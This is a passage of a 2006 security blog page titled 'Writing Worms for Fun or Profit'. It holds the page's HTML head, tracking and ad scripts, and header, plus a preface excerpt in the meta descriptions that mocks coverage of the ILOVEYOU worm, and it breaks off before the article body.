<!DOCTYPE html>
<html lang="en-US">
<head>
<meta charset="UTF-8" />
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
<link rel="pingback" href="https://www.darknet.org.uk/xmlrpc.php" />
<title>Writing Worms for Fun or Profit - Darknet</title>

<!-- Social Warfare v4.2.1 https://warfareplugins.com - BEGINNING OF OUTPUT -->
<meta property="og:description" content="0x00: Preface Media, kindly supported by AV 'experts', drawn apocalyptical vison of desctruction caused by stupid M$ Outlook / VisualBasic worm, called 'ILOVEYOU'. Absurdal estimations - $10M lost for 'defending the disease', especially when you take a look at increasing with the speed of light value of AV companies market shares, made many people sick. Lame VBS application that isn't even able to spread without luser click-me interaction, and is limited to one, desk-end operating system... Worm that sends itself to people in your addressbook, and, in it's original version, kills mp3 files on your disk . And you call">
<meta property="og:title" content="Writing Worms for Fun or Profit">
<meta property="article_publisher" content="https://www.facebook.com/darknetorguk/">
<meta property="fb:app_id" content="529576650555031">
<meta property="og:type" content="article">
<meta property="og:url" content="https://www.darknet.org.uk/2006/12/writing-worms-for-fun-or-profit/">
<meta property="og:site_name" content="Darknet">
<meta property="article:published_time" content="2006-12-02T09:52:56+08:00">
<meta property="article:modified_time" content="2010-06-18T12:18:18+08:00">
<meta property="og:updated_time" content="2010-06-18T12:18:18+08:00">
<meta name="twitter:title" content="Writing Worms for Fun or Profit">
<meta name="twitter:description" content="0x00: Preface Media, kindly supported by AV 'experts', drawn apocalyptical vison of desctruction caused by stupid M$ Outlook / VisualBasic worm, called 'ILOVEYOU'. Absurdal estimations - $10M lost for 'defending the disease', especially when you take a look at increasing with the speed of light value of AV companies market shares, made many people sick. Lame VBS application that isn't even able to spread without luser click-me interaction, and is limited to one, desk-end operating system... Worm that sends itself to people in your addressbook, and, in it's original version, kills mp3 files on your disk . And you call">
<meta name="twitter:site" content="@THEdarknet">
<meta name="twitter:creator" content="@THEdarknet">
<meta name="twitter:card" content="summary">
<style>
	@font-face {
		font-family: "sw-icon-font";
		src:url("https://www.darknet.org.uk/wp-content/plugins/social-warfare/assets/fonts/sw-icon-font.eot?ver=4.2.1");
		src:url("https://www.darknet.org.uk/wp-content/plugins/social-warfare/assets/fonts/sw-icon-font.eot?ver=4.2.1#iefix") format("embedded-opentype"),
		url("https://www.darknet.org.uk/wp-content/plugins/social-warfare/assets/fonts/sw-icon-font.woff?ver=4.2.1") format("woff"),
		url("https://www.darknet.org.uk/wp-content/plugins/social-warfare/assets/fonts/sw-icon-font.ttf?ver=4.2.1") format("truetype"),
		url("https://www.darknet.org.uk/wp-content/plugins/social-warfare/assets/fonts/sw-icon-font.svg?ver=4.2.1#1445203416") format("svg");
		font-weight: normal;
		font-style: normal;
		font-display:block;
	}
</style>
<!-- Social Warfare v4.2.1 https://warfareplugins.com - END OF OUTPUT -->


<!--  Mobile viewport scale -->
<meta name="viewport" content="width=device-width, initial-scale=1"/>
<meta name="dc.title" content="Writing Worms for Fun or Profit - Darknet" />
<meta name="dc.description" content="0x00: Preface Media, kindly supported by AV &quot;experts&quot;, drawn apocalyptical vison of desctruction caused by stupid M$ Outlook / VisualBasic worm, called &quot;ILOVEYOU&quot;. Absurdal estimations - $10M lost for &quot;defending the disease&quot;, especially when you take a look at increasing with the speed of light value of AV companies market&hellip;" />
<meta name="dc.relation" content="https://www.darknet.org.uk/2006/12/writing-worms-for-fun-or-profit/" />
<meta name="dc.source" content="https://www.darknet.org.uk/" />
<meta name="dc.language" content="en_US" />
<meta name="description" content="0x00: Preface Media, kindly supported by AV &quot;experts&quot;, drawn apocalyptical vison of desctruction caused by stupid M$ Outlook / VisualBasic worm, called &quot;ILOVEYOU&quot;. Absurdal estimations - $10M lost for &quot;defending the disease&quot;, especially when you take a look at increasing with the speed of light value of AV companies market&hellip;" />
<meta name="robots" content="index, follow" />
<meta name="googlebot" content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1" />
<meta name="bingbot" content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1" />
<link rel="canonical" href="https://www.darknet.org.uk/2006/12/writing-worms-for-fun-or-profit/" />
<meta name="author" content="Darknet">
<link rel='dns-prefetch' href='//s.w.org' />
<link rel="alternate" type="application/rss+xml" title="Darknet &raquo; Feed" href="https://www.darknet.org.uk/feed/" />
<link rel="alternate" type="application/rss+xml" title="Darknet &raquo; Comments Feed" href="https://www.darknet.org.uk/comments/feed/" />
<link rel="alternate" type="application/rss+xml" title="Darknet &raquo; Writing Worms for Fun or Profit Comments Feed" href="https://www.darknet.org.uk/2006/12/writing-worms-for-fun-or-profit/feed/" />
		<script type="text/javascript">
			window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/13.0.1\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/13.0.1\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/www.darknet.org.uk\/wp-includes\/js\/wp-emoji-release.min.js?ver=5.7"}};
			!function(e,a,t){var n,r,o,i=a.createElement("canvas"),p=i.getContext&&i.getContext("2d");function s(e,t){var a=String.fromCharCode;p.clearRect(0,0,i.width,i.height),p.fillText(a.apply(this,e),0,0);e=i.toDataURL();return p.clearRect(0,0,i.width,i.height),p.fillText(a.apply(this,t),0,0),e===i.toDataURL()}function c(e){var t=a.createElement("script");t.src=e,t.defer=t.type="text/javascript",a.getElementsByTagName("head")[0].appendChild(t)}for(o=Array("flag","emoji"),t.supports={everything:!0,everythingExceptFlag:!0},r=0;r<o.length;r++)t.supports[o[r]]=function(e){if(!p||!p.fillText)return!1;switch(p.textBaseline="top",p.font="600 32px Arial",e){case"flag":return s([127987,65039,8205,9895,65039],[127987,65039,8203,9895,65039])?!1:!s([55356,56826,55356,56819],[55356,56826,8203,55356,56819])&&!s([55356,57332,56128,56423,56128,56418,56128,56421,56128,56430,56128,56423,56128,56447],[55356,57332,8203,56128,56423,8203,56128,56418,8203,56128,56421,8203,56128,56430,8203,56128,56423,8203,56128,56447]);case"emoji":return!s([55357,56424,8205,55356,57212],[55357,56424,8203,55356,57212])}return!1}(o[r]),t.supports.everything=t.supports.everything&&t.supports[o[r]],"flag"!==o[r]&&(t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&t.supports[o[r]]);t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&!t.supports.flag,t.DOMReady=!1,t.readyCallback=function(){t.DOMReady=!0},t.supports.everything||(n=function(){t.readyCallback()},a.addEventListener?(a.addEventListener("DOMContentLoaded",n,!1),e.addEventListener("load",n,!1)):(e.attachEvent("onload",n),a.attachEvent("onreadystatechange",function(){"complete"===a.readyState&&t.readyCallback()})),(n=t.source||{}).concatemoji?c(n.concatemoji):n.wpemoji&&n.twemoji&&(c(n.twemoji),c(n.wpemoji)))}(window,document,window._wpemojiSettings);
		</script>
		<style type="text/css">
img.wp-smiley,
img.emoji {
	display: inline !important;
	border: none !important;
	box-shadow: none !important;
	height: 1em !important;
	width: 1em !important;
	margin: 0 .07em !important;
	vertical-align: -0.1em !important;
	background: none !important;
	padding: 0 !important;
}
</style>
	<link rel="stylesheet" href="https://www.darknet.org.uk/wp-content/cache/minify/eb33a.css" media="all" />








<!--[if lt IE 9]>
<link href="https://cdn.darknet.org.uk/wp-content/themes/canvas/css/non-responsive.css" rel="stylesheet" type="text/css" />
<style type="text/css">.col-full, #wrapper { width: 1000px; max-width: 1000px; } #inner-wrapper { padding: 0; } body.full-width #header, #nav-container, body.full-width #content, body.full-width #footer-widgets, body.full-width #footer { padding-left: 0; padding-right: 0; } body.fixed-mobile #top, body.fixed-mobile #header-container, body.fixed-mobile #footer-container, body.fixed-mobile #nav-container, body.fixed-mobile #footer-widgets-container { min-width: 1000px; padding: 0 1em; } body.full-width #content { width: auto; padding: 0 1em;}</style>
<![endif]-->
<script async src="https://www.darknet.org.uk/wp-content/cache/minify/818c0.js"></script>


<script type='text/javascript' id='quicktags-js-extra'>
/* <![CDATA[ */
var quicktagsL10n = {"closeAllOpenTags":"Close all open tags","closeTags":"close tags","enterURL":"Enter the URL","enterImageURL":"Enter the URL of the image","enterImageDescription":"Enter a description of the image","textdirection":"text direction","toggleTextdirection":"Toggle Editor Text Direction","dfw":"Distraction-free writing mode","strong":"Bold","strongClose":"Close bold tag","em":"Italic","emClose":"Close italic tag","link":"Insert link","blockquote":"Blockquote","blockquoteClose":"Close blockquote tag","del":"Deleted text (strikethrough)","delClose":"Close deleted text tag","ins":"Inserted text","insClose":"Close inserted text tag","image":"Insert image","ul":"Bulleted list","ulClose":"Close bulleted list tag","ol":"Numbered list","olClose":"Close numbered list tag","li":"List item","liClose":"Close list item tag","code":"Code","codeClose":"Close code tag","more":"Insert Read More tag"};
/* ]]> */
</script>
<script async src="https://www.darknet.org.uk/wp-content/cache/minify/5fab5.js"></script>

<script type='text/javascript' id='crayon_js-js-extra'>
/* <![CDATA[ */
var CrayonSyntaxSettings = {"version":"_2.7.2_beta","is_admin":"0","ajaxurl":"https:\/\/www.darknet.org.uk\/wp-admin\/admin-ajax.php","prefix":"crayon-","setting":"crayon-setting","selected":"crayon-setting-selected","changed":"crayon-setting-changed","special":"crayon-setting-special","orig_value":"data-orig-value","debug":""};
var CrayonSyntaxStrings = {"copy":"Press %s to Copy, %s to Paste","minimize":"Click To Expand Code"};
var CrayonTagEditorSettings = {"home_url":"https:\/\/www.darknet.org.uk","css":"crayon-te","css_selected":"crayon-selected","code_css":"#crayon-code","url_css":"#crayon-url","url_info_css":"#crayon-te-url-info","lang_css":"#crayon-lang","title_css":"#crayon-title","mark_css":"#crayon-mark","range_css":"#crayon-range","inline_css":"crayon-inline","inline_hide_css":"crayon-hide-inline","inline_hide_only_css":"crayon-hide-inline-only","hl_css":"#crayon-highlight","switch_html":"#content-html","switch_tmce":"#content-tmce","tinymce_button_generic":".mce-btn","tinymce_button":"a.mce_crayon_tinymce,.mce-i-crayon_tinymce","tinymce_button_unique":"mce_crayon_tinymce","tinymce_highlight":"mce-active","submit_css":"#crayon-te-ok","cancel_css":"#crayon-te-cancel","content_css":"#crayon-te-content","dialog_title_css":"#crayon-te-title","submit_wrapper_css":"#crayon-te-submit-wrapper","data_value":"data-value","attr_sep":":","css_sep":"_","fallback_lang":"default","add_text":"Add Code","edit_text":"Edit Code","quicktag_text":"crayon","submit_add":"Add","submit_edit":"Save","bar":"#crayon-te-bar","bar_content":"#crayon-te-bar-content","extensions":{"scpt":"applescript","applescript":"applescript","swf":"as","fla":"as","cs":"c#","h":"c++","hh":"c++","hpp":"c++","hxx":"c++","h++":"c++","cc":"c++","cpp":"c++","cxx":"c++","c++":"c++","pas":"delphi","java":"java","class":"java","jar":"java","mel":"mel","ma":"mel","mv":"miva","mvc":"miva","mvt":"miva","m":"objc","mm":"objc","psc":"papyrus","pl":"perl","py":"python","pyw":"python","pyc":"python","pyo":"python","pyd":"python","rb":"ruby","rbx":"ruby","rhtml":"ruby","vbs":"vb"}};
var CrayonSyntaxSettings = {"version":"_2.7.2_beta","is_admin":"0","ajaxurl":"https:\/\/www.darknet.org.uk\/wp-admin\/admin-ajax.php","prefix":"crayon-","setting":"crayon-setting","selected":"crayon-setting-selected","changed":"crayon-setting-changed","special":"crayon-setting-special","orig_value":"data-orig-value","debug":""};
var CrayonSyntaxStrings = {"copy":"Press %s to Copy, %s to Paste","minimize":"Click To Expand Code"};
/* ]]> */
</script>
<script async src="https://www.darknet.org.uk/wp-content/cache/minify/44ba0.js"></script>






<!-- Adjust the website width -->
<style type="text/css">
	.col-full, #wrapper { max-width: 1000px !important; }
</style>

<link rel="https://api.w.org/" href="https://www.darknet.org.uk/wp-json/" /><link rel="alternate" type="application/json" href="https://www.darknet.org.uk/wp-json/wp/v2/posts/406" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://www.darknet.org.uk/xmlrpc.php?rsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://cdn.darknet.org.uk/wp-includes/wlwmanifest.xml" /> 
<meta name="generator" content="WordPress 5.7" />
<link rel='shortlink' href='https://www.darknet.org.uk/?p=406' />
<link rel="alternate" type="application/json+oembed" href="https://www.darknet.org.uk/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fwww.darknet.org.uk%2F2006%2F12%2Fwriting-worms-for-fun-or-profit%2F" />
<link rel="alternate" type="text/xml+oembed" href="https://www.darknet.org.uk/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fwww.darknet.org.uk%2F2006%2F12%2Fwriting-worms-for-fun-or-profit%2F&#038;format=xml" />
<script type="text/javascript"><!--

	            function addEvent(elm, evType, fn, useCapture)
	            // addEvent and removeEvent
	            // cross-browser event handling for IE5+,  NS6 and Mozilla
	            // By Scott Andrew
	            {
	              if (elm.addEventListener){
	                  elm.addEventListener(evType, fn, useCapture);
	                  return true;
	              } else if (elm.attachEvent){
	                  var r = elm.attachEvent("on"+evType, fn);
	                  return r;
	              } else {
	                  // alert("Handler could not be removed");
	              }
	            }
	            function externalLinks() {
	             if (!document.getElementsByTagName) return;
	             var anchors = document.getElementsByTagName("a");
				 var newwindows =0;
	             for (var i=0; i<anchors.length; i++) {
	               var anchor = anchors[i];
	               if (anchor.getAttribute("href") && anchor.getAttribute("rel") == "external") {
	                        anchor.setAttribute("target","_blank");
							newwindows++;
					}
	             }
	            }

	            addEvent(window, "load", externalLinks);

	            //-->
	            </script>
	            <script type="text/javascript">
	window._wp_rp_static_base_url = 'https://rp.zemanta.com/static/';
	window._wp_rp_wp_ajax_url = "https://www.darknet.org.uk/wp-admin/admin-ajax.php";
	window._wp_rp_plugin_version = '3.6.1';
	window._wp_rp_post_id = '406';
	window._wp_rp_num_rel_posts = '3';
	window._wp_rp_thumbnails = false;
	window._wp_rp_post_title = 'Writing+Worms+for+Fun+or+Profit';
	window._wp_rp_post_tags = ['hacking', 'viruses', 'malware', 'worms', 'programming', 'programming-viruses', 'programming-worms', 'computer-security', 'virii', 'darknet', 'virus', 'malware', 'old+skool+philes', 'programming', 'write', 'program', 'system', 'worm', 'light', 'market', 'project', 'internet', 'av', 'vb', 'develop', 'diseas', 'app', 'invis', 'mp3'];
</script>
<style type="text/css">
.related_post_title {
}
ul.related_post {
  list-style-type: none;
}
ul.related_post li {
}
ul.related_post li a {
}
ul.related_post li img {
}

ul.related_post li:before {
  content: "- ";
  text-indent: -5px;
  font-weight: bold;
}</style>

<!-- Custom CSS Styling -->
<style type="text/css">
#logo .site-title, #logo .site-description { display:none; }
body {background-color:#3f312e;background-image:url(https://cdn.darknet.org.uk/images/background.png);background-repeat:repeat-x;background-position:top left;background-attachment:scroll;border-top:0px solid #000000;}
a:link, a:visited, #loopedSlider a.flex-prev:hover, #loopedSlider a.flex-next:hover {color:#df6f0b} .quantity .plus, .quantity .minus {background-color: #df6f0b;}
#header {background-color:#262626;background-image:url(https://cdn.darknet.org.uk/images/background.png);background-repeat:repeat-x;background-position:left top;margin-top:0px;margin-bottom:0px;padding-top:40px;padding-bottom:40px;border:0px solid #262626;}
#logo .site-title a {font:bold 40px/1em Arial, sans-serif;color:#222222;}
#logo .site-description {font:300 13px/1em Arial, sans-serif;color:#999999;}
#inner-wrapper {padding-left:30px; padding-right:30px;background-color:#ffffff;border-radius:2px;} .col-full { width: auto; } @media only screen and (max-width:767px) { #inner-wrapper { margin:0; border-radius:none; padding-left:1em; padding-right: 1em; border: none; } } 
body, p { font:300 14px/1.5em Arial, sans-serif;color:#555555; }
h1 { font:bold 28px/1.2em Arial, sans-serif;color:#a45109; }h2 { font:bold 24px/1.2em Arial, sans-serif;color:#555555; }h3 { font:bold 20px/1.2em Arial, sans-serif;color:#555555; }h4 { font:bold 16px/1.2em Arial, sans-serif;color:#222222; }h5 { font:bold 14px/1.2em Arial, sans-serif;color:#222222; }h6 { font:bold 12px/1.2em Arial, sans-serif;color:#222222; }
.page-title, .post .title, .page .title {font:bold 28px/1.1em Arial, sans-serif;color:#a45109;}
.post .title a:link, .post .title a:visited, .page .title a:link, .page .title a:visited {color:#a45109}
.post-meta { font:300 12px/1.5em Arial, sans-serif;color:#999999; }
.entry, .entry p{ font:300 15px/1.5em Arial, sans-serif;color:#555555; }
.post-more {font:300 13px/1.5em Arial, sans-serif;color:;border-top:0px solid #e6e6e6;border-bottom:0px solid #e6e6e6;}
#post-author, #connect {border-top:1px solid #e6e6e6;border-bottom:1px solid #e6e6e6;border-left:1px solid #e6e6e6;border-right:1px solid #e6e6e6;border-radius:5px;-moz-border-radius:5px;-webkit-border-radius:5px;background-color:#fafafa}
.nav-entries a, .woo-pagination { font:300 13px/1em Arial, sans-serif;color:#888; }
.woo-pagination a, .woo-pagination a:hover {color:#888!important}
.widget h3 {font:bold 14px/1.2em Arial, sans-serif;color:#3f3f3f;border-bottom:1px solid #e6e6e6;}
.widget_recent_comments li, #twitter li { border-color: #e6e6e6;}
.widget p, .widget .textwidget { font:300 13px/1.5em Arial, sans-serif;color:#666666; }
.widget {font:300 13px/1.5em Arial, sans-serif;color:#666666;border-radius:0px;-moz-border-radius:0px;-webkit-border-radius:0px;}
#tabs, .widget_woodojo_tabs .tabbable {background-color:#d8d8d8;}
#tabs .inside li a, .widget_woodojo_tabs .tabbable .tab-pane li a { font:bold 12px/1.5em Arial, sans-serif;color:#3f3f3f; }
#tabs .inside li span.meta, .widget_woodojo_tabs .tabbable .tab-pane li span.meta { font:300 11px/1.5em Arial, sans-serif;color:#666666; }
#tabs ul.wooTabs li a, .widget_woodojo_tabs .tabbable .nav-tabs li a { font:300 11px/2em Arial, sans-serif;color:#666666; }
@media only screen and (min-width:768px) {
ul.nav li a, #navigation ul.rss a, #navigation ul.cart a.cart-contents, #navigation .cart-contents #navigation ul.rss, #navigation ul.nav-search, #navigation ul.nav-search a { font:300 14px/1.2em Arial, sans-serif;color:#444444; } #navigation ul.rss li a:before, #navigation ul.nav-search a.search-contents:before { color:#444444;}
#navigation ul.nav > li a:hover, #navigation ul.nav > li:hover a, #navigation ul.nav li ul li a, #navigation ul.cart > li:hover > a, #navigation ul.cart > li > ul > div, #navigation ul.cart > li > ul > div p, #navigation ul.cart > li > ul span, #navigation ul.cart .cart_list a, #navigation ul.nav li.current_page_item a, #navigation ul.nav li.current_page_parent a, #navigation ul.nav li.current-menu-ancestor a, #navigation ul.nav li.current-cat a, #navigation ul.nav li.current-menu-item a { color:#444444!important; }
#navigation ul.nav > li a:hover, #navigation ul.nav > li:hover, #navigation ul.nav li ul, #navigation ul.cart li:hover a.cart-contents, #navigation ul.nav-search li:hover a.search-contents, #navigation ul.nav-search a.search-contents + ul, #navigation ul.cart a.cart-contents + ul, #navigation ul.nav li.current_page_item a, #navigation ul.nav li.current_page_parent a, #navigation ul.nav li.current-menu-ancestor a, #navigation ul.nav li.current-cat a, #navigation ul.nav li.current-menu-item a{background-color:#cecece!important}
#navigation ul.nav li ul, #navigation ul.cart > li > ul > div  { border: 0px solid #9e9e9e; }
#navigation ul.nav > li:hover > ul  { left: 0; }
#navigation ul.nav > li  { border-right: 0px solid #9e9e9e; }#navigation ul.nav > li:hover > ul  { left: 0; }
#navigation { box-shadow: none; -moz-box-shadow: none; -webkit-box-shadow: none; }#navigation ul li:first-child, #navigation ul li:first-child a { border-radius:2px 0 0 2px; -moz-border-radius:2px 0 0 2px; -webkit-border-radius:2px 0 0 2px; }
#nav-container { margin-top:10px;margin-bottom:10px; }#navigation {background:#d9d9d9;border-top:1px solid #9e9e9e;border-bottom:0px solid #9e9e9e;border-left:1px solid #9e9e9e;border-right:1px solid #9e9e9e;border-radius:2px; -moz-border-radius:2px; -webkit-border-radius:2px;margin-top:0;margin-bottom:0;}
#top, #top ul.nav li ul li a:hover { background:#9e9e9e;}
#top ul.nav li a { font:300 14px/1.6em Arial, sans-serif;color:#ddd; }
}
#footer, #footer p { font:300 13px/1.4em Arial, sans-serif;color:#999999; }
#footer {border-top:1px solid #dbdbdb;border-bottom:0px solid ;border-left:0px solid ;border-right:0px solid ;border-radius:0px; -moz-border-radius:0px; -webkit-border-radius:0px;}
.magazine #loopedSlider .content h2.title a { font:bold 24px/1em Arial, sans-serif;color:#ffffff; }
.wooslider-theme-magazine .slide-title a { font:bold 24px/1em Arial, sans-serif;color:#ffffff; }
.magazine #loopedSlider .content .excerpt p { font:300 13px/1.5em Arial, sans-serif;color:#cccccc; }
.wooslider-theme-magazine .slide-content p, .wooslider-theme-magazine .slide-excerpt p { font:300 13px/1.5em Arial, sans-serif;color:#cccccc; }
.magazine .block .post .title a {font:bold 18px/1.2em Arial, sans-serif;color:#a45109; }
#loopedSlider.business-slider .content h2 { font:bold 24px/1em Arial, sans-serif;color:#ffffff; }
#loopedSlider.business-slider .content h2.title a { font:bold 24px/1em Arial, sans-serif;color:#ffffff; }
.wooslider-theme-business .has-featured-image .slide-title { font:bold 24px/1em Arial, sans-serif;color:#ffffff; }
.wooslider-theme-business .has-featured-image .slide-title a { font:bold 24px/1em Arial, sans-serif;color:#ffffff; }
#wrapper #loopedSlider.business-slider .content p { font:thin 13px/1.5em Arial, sans-serif;color:#cccccc; }
.wooslider-theme-business .has-featured-image .slide-content p { font:thin 13px/1.5em Arial, sans-serif;color:#cccccc; }
.wooslider-theme-business .has-featured-image .slide-excerpt p { font:thin 13px/1.5em Arial, sans-serif;color:#cccccc; }
.archive_header { font:bold 18px/1em Arial, sans-serif;color:#a45109; }
.archive_header {border-bottom:1px solid #e6e6e6;}
.archive_header .catrss { display:none; }
</style>

<!-- Custom Favicon -->
<link rel="shortcut icon" href="https://cdn.darknet.org.uk/favicon.ico"/>
<!-- Options Panel Custom CSS -->
<style type="text/css">
iframe {
 max-width: none;
}

blockquote {
  background: #f9f9f9;
  margin: 1.5em 10px;
  padding: 0.5em 10px;
  quotes: "201C""201D";
}
blockquote:before {
  color: #ccc;
  content: open-quote;
  padding-right: 10px;
  line-height: 0.1em;
  margin-right: 0.25em;
  vertical-align: -0.4em;
  left: 7px !important;
}

.wp-fb-like-ranking {
  list-style-type: none;
}

ul.wp-fb-like-ranking {
  list-style-type: none;
  text-indent: -30px;
}

ul.wp-fb-like-ranking li:before {
  content: "â ";
  text-indent: -5px;
  font-weight: bold;
}

.wp-core-ui .button, .wp-core-ui .button-secondary {
background: #777777;
}

.archive_header {
    font: bold 32px/1em Arial, sans-serif;
    color: #a45109;
}
 
#navigation ul.rss li.sub-email a:before {
        content: " ";
background: url(https://cdn.darknet.org.uk/images/icon_email.png) no-repeat 0 0;
    background-size: 100%;		}

#navigation ul.rss li.sub-rss a:before {
        content: " ";
background: url(https://cdn.darknet.org.uk/images/icon_rss.png) no-repeat 0 0;
    background-size: 100%; }

#navigation ul.rss li.sub-twitter a:before {
        content: " ";
background: url(https://cdn.darknet.org.uk/images/icon_twitter.png) no-repeat 0 0;
    background-size: 100%;		}

#navigation ul.rss li.sub-fb a:before {
        content: " ";
background: url(https://cdn.darknet.org.uk/images/icon_fb.png) no-repeat 0 0;
    background-size: 100%;		}

#navigation ul.rss li.sub-gplus a:before {
        content: " ";
background: url(https://cdn.darknet.org.uk/images/icon_gplus.png) no-repeat 0 0;
    background-size: 100%;		}

#navigation .menus.nav-icons-2 .side-nav {
    width: 15em;
}
</style>


<!-- Custom Stylesheet -->
<link rel="stylesheet" href="https://www.darknet.org.uk/wp-content/cache/minify/72a95.css" media="all" />


<!-- Theme version -->
<meta name="generator" content="Darknet Canvas 1.0.0" />
<meta name="generator" content="Canvas 5.12.0" />
<meta name="generator" content="WooFramework 6.2.9" />
<!-- Google Analytics Tracking by Google Analyticator 6.5.4: http://www.videousermanuals.com/google-analyticator/ -->
<script type="text/javascript">
    var analyticsFileTypes = ['zip','tar.gz','bzip2'];
    var analyticsSnippet = 'disabled';
    var analyticsEventTracking = 'enabled';
</script>
<script type="text/javascript">
	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
	})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
	ga('create', 'UA-53073-4', 'auto');
	ga('require', 'displayfeatures');
 
	ga('send', 'pageview');
</script>

<script async src='https://www.googletagmanager.com/gtag/js?id=UA-53073-4'></script>
<script>
window.dataLayer = window.dataLayer || [];
function gtag(){dataLayer.push(arguments);}gtag('js', new Date());
gtag('config', 'UA-53073-4' , {'allow_display_features': false,});

</script>
</head>
<body class="post-template-default single single-post postid-406 single-format-standard chrome alt-style-darknet boxed-layout two-col-left width-1000 two-col-left-1000">
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<script>
  (adsbygoogle = window.adsbygoogle || []).push({
    google_ad_client: "ca-pub-3033787195489589",
    enable_page_level_ads: true
  });
</script>

<script>
  window.fbAsyncInit = function() {
    FB.init({
      appId      : '249994988347175',
      xfbml      : true,
      version    : 'v2.7'
    });
  };

  (function(d, s, id){
     var js, fjs = d.getElementsByTagName(s)[0];
     if (d.getElementById(id)) {return;}
     js = d.createElement(s); js.id = id;
     js.src = "//connect.facebook.net/en_US/sdk.js";
     fjs.parentNode.insertBefore(js, fjs);
   }(document, 'script', 'facebook-jssdk'));
</script>

<!-- Facebook Pixel Code -->
<script>
  !function(f,b,e,v,n,t,s)
  {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
  n.callMethod.apply(n,arguments):n.queue.push(arguments)};
  if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
  n.queue=[];t=b.createElement(e);t.async=!0;
  t.src=v;s=b.getElementsByTagName(e)[0];
  s.parentNode.insertBefore(t,s)}(window, document,'script',
  'https://connect.facebook.net/en_US/fbevents.js');
  fbq('init', '1932447117030112');
  fbq('track', 'PageView');
</script>
<noscript><img height="1" width="1" style="display:none"
  src="https://www.facebook.com/tr?id=1932447117030112&ev=PageView&noscript=1"
/></noscript>
<!-- End Facebook Pixel Code --><div id="wrapper">

	<div id="inner-wrapper">

	<h3 class="nav-toggle icon"><a href="#navigation">Navigation</a></h3>

	<header id="header" class="col-full">

		<div id="logo">
<a href="https://www.darknet.org.uk/" title="Hacking Tools, Hacker News &amp; Cyber Security"><img src="https://cdn.darknet.org.uk/images/new_title.png" alt="Darknet" /></a>
<span class="site-title"><a href="https://www.darknet.org.uk/">Darknet</a></span>
<span class="site-description">Hacking Tools, Hacker News &amp; Cyber Security</span>
</div>
	    <div class="header-widget">
	        <div id="text-13" class="widget widget_text">			<div class="textwidget"><div align="center"><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<!-- Darknet Top 468x60 -->
<ins class="adsbygoogle"
     style="display:inline-block;width:468px;height:60px"
     data-ad-client="ca-pub-3033787195489589"
     data-ad-slot="5579656443"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script></div></div>
		</div>	    </div>
	
	</header>
	<nav id="navigation" class="col-full" role="navigation">

	
	<section class="menus nav-icons nav-icons-2">

		<a href="https://www.darknet.org.uk" class="nav-home"><span>Home</span></a>

	<h3>Top Nav</h3><ul id="main-nav" class="nav fl"><li id="menu-item-3596" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-3596"><a href="https://www.darknet.org.uk/">Home</a></li>
<li id="menu-item-3591" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-3591"><a href="https://www.darknet.org.uk/about/">About Darknet</a></li>
<li id="menu-item-3590" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-3590"><a href="https://www.darknet.org.uk/popular-posts/">Popular Posts</a></li>
<li id="menu-item-3587" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-3587"><a href="https://www.darknet.org.uk/darknet-archives/">Darknet Archives</a></li>
<li id="menu-item-3588" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-3588"><a href="https://www.darknet.org.uk/contact-darknet/">Contact Darknet</a>
<ul class="sub-menu">
	<li id="menu-item-3589" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-3589"><a href="https://www.darknet.org.uk/contact-darknet/advertise/">Advertise</a></li>
</ul>
</li>
</ul>	<div class="side-nav">
	<ul class="rss fr">
                <li class="sub-fb"><a href="https://www.facebook.com/darknetorguk/" target="_blank"></a></li>
		<li class="sub-twitter"><a href="https://twitter.com/THEdarknet" target="_blank"></a></li>
				<li class="sub-email"><a href="http://www.feedblitz.com/f/?Sub=74663" target="_blank"></a></li>
						<li class="sub-rss"><a href="https://www.darknet.org.uk/feed/" target="_blank"></a></li>
			</ul>
			</div><!-- /#side-nav -->

	</section><!-- /.menus -->

	<a href="#top" class="nav-close"><span>Return to Content</span></a>

</nav>
	

<!-- Google Auto Ads added 23/05/2019 -->

<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({
          google_ad_client: "ca-pub-3033787195489589",
          enable_page_level_ads: true
     });
</script>

<!-- Google Adsense Responsive Ad Links added 14/02/2016 -->

<br />
<p align="center">
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<!-- Darknet Responsive Ad Links -->
<ins class="adsbygoogle"
     style="display:block"
     data-ad-client="ca-pub-3033787195489589"
     data-ad-slot="8470996446"
     data-ad-format="link"></ins>
<script>
(adsbygoogle = window.adsbygoogle || []).push({});
</script>
</p>
<br />
       
    <!-- #content Starts -->
	    <div id="content" class="col-full">
    
    	<div id="main-sidebar-container">    

            <!-- #main Starts -->
                        <section id="main">                       
<script>
  fbq('track', 'ViewContent');
